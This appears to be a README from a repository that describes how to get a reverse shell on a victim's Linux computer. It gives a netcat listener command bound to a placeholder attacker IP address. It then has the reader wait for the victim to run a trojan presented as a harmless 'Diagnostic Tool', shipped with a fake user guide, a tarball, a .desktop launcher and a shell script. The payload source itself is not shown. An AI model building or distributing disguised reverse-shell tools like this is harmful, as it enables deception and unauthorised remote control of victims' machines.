# Gain access to victim's computer with reverse shell

1. On **attacker's** computer (Linux with netcat installed), run the following if
    - victim is using linux (**our case**)
    ```shell
    $ sudo nc -lnvp PORT_NUMBER -s ATTACKERS_IP_ADDRESS
    ```


2. Wait for the victim to run the 'Diagnostic Tool' executable file: 
    - Linux:
        - [User Guide PDF](./PDF%20Documents/User%20guide.pdf)
        - Download this and uncompressed it: [NetworkingTool.tar.gz](./NetworkingTool.tar.gz)
        - Source code:
            - [NetworkTool.desktop](./NetworkTool.desktop) (executable), together with
            - [script.sh](./script.sh)


3. Boom! Access granted!
